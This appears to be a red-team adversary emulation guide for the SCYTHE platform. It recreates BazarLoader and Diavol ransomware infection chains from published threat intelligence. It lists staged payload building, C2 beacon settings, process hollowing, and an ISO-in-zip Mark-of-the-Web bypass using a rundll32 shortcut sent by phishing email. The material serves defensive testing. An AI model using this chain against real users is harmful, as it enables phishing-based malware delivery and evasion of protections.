# BazarLoader - Adversary Emulation Plan

BazarLoader is used as part of the initial access portion of multiple threat groups. The threat focuses on bypassing defenses and is commonly changing TTPs. In this threat, we cover a number of different examples observed in the wild.

## BazarLoader Excel to WMIC to PowerShell to rundll32.exe
This CTI comes from https://app.any.run/tasks/c5dc698b-8e86-4e50-8b32-d8f45f7538b3/

### BazarLoaderStage0
1. Download and import the threats in JSON format to your SCYTHE instance
2. Create a new campaign `BazarLoaderStage0` with HTTPS
3. Import from Existing Threat: BazarLoaderStage0
4. Modify the process hollowing command to match the location where Microsoft Excel is installed in the target system
5. Launch the Campaign
6. Start Stage 1 and 2 before execution

### BazarLoaderStage1
1. Create a new campaign `BazarLoaderStage1` with HTTPS
2. Import from Existing Threat: BazarLoaderStage1
3. Launch the Campaign
4. Save the 64-bit EXE as `BazarLoaderStage1.exe`
5. Upload to VFS:/shared/BazarLoader/BazarLoaderStage1.exe

### BazarLoaderStage2
1. Create a new campaign `BazarLoaderStage2` with HTTPS
2. Add any automation you would like to execute
3. Launch the Campaign
4. Download the DLL with entry-point set to `setscreen`
5. Save the DLL as `87764675478.dll`
6. Upload the DLL to VFS:/shared/BazarLoader/87764675478.dll

## Diavol Ransomware
The CTI for this threat comes from https://thedfirreport.com/2021/12/13/diavol-ransomware/ and is further explained in our #ThreatThursday blog series: https://www.scythe.io/library/adversary-emulation-diavol-ransomware-threatthursday

### DiavolStage0
1. Download and import the threats in JSON format to your SCYTHE instance
2. Download the Virtual File System (VFS) files under Diavol/VFS
3. Upload the VFS files to your SCYTHE VFS in the following location: VFS:/shared/Diavol
4. Create a new campaign `DiavolStage0` with HTTPS and the communication options from the CTI. You can import from the config.json on this GitHub or manually set it to: `--cp yourdomain[.]com:443 --secure true --multipart 10240 --heartbeat 5 --jitter 10`
5. Import from Existing Threat: DiavolStage0
6. Launch the Campaign
7. Download payload in DLL format setting the entry-point to `BasicScore`
8. Save the DLL as `SharedFiles.dll`
9. Start Stage 1 and 2 before execution
11. Copy the src folder from our [Compound Actions GitHub for T1553.005](https://github.com/scythe-io/compound-actions/tree/main/T1553.005%20-%20Mark-of-the-Web%20Bypass/src) to a working directory on your Windows system
12. Put the SCYTHE DLL in the Folder2Iso of the working directory
13. In the Folder2Iso directory, create a shortcut called `Documents` and set the `Target` to: `C:\Windows\System32\rundll32.exe SharedFiles.dll,BasicScore`
14. Open a Windows command prompt and cd to the working directory
15. Run `Folder2Iso.exe "Folder2Iso" "%USERPROFILE%\Downloads\new-documents-2005.iso" "Diavol" 0 0 0 "None"` This will take all the content of the Folder2Iso folder and create an ISO of it
16. Zip the ISO and call it `new-documents-2005.zip`
17. Upload the zip file to Microsoft OneDrive and copy the link
18. Send a phishing email with the link to the Microsoft OneDrive zip file
19. If the end user downloads the ZIP and double clicks the ISO, it will be mounted on their endpoint. The user will need to double click the shortcut to begin execution.

### DiavolStage1
1. Create a new campaign `DiavolStage1` with HTTPS and the communication options from the CTI. You can import from the config.json on this GitHub or manually set it to: `--cp yourdomain[.]com:443 --secure true --multipart 10240 --heartbeat 5 --jitter 10`
2. Import from Existing Threat: DiavolStage1
3. Launch the Campaign
4. Download payload in EXE format and save it as `DiavolStage1.exe`
5. Upload the `DiavolStage1.exe` to the VFS under VFS:/shared/Diavol

### DiavolStage2
1. Create a new campaign `DiavolStage2` with HTTPS and the communication options from the CTI. You can import from the config.json on this GitHub or manually set it to: `--cp yourdomain[.]com:443 --secure true --multipart 10240 --heartbeat 5 --jitter 10`
2. Import from Existing Threat: DiavolStage2 or create any automation you would like to execute
3. Launch the Campaign
4. Download payload in DLL format setting the entry-point to `EnterDll`
5. Save the DLL as `tfpkuengdlu.dll`
6. Upload the `tfpkuengdlu.dll` to the VFS under VFS:/shared/Diavol
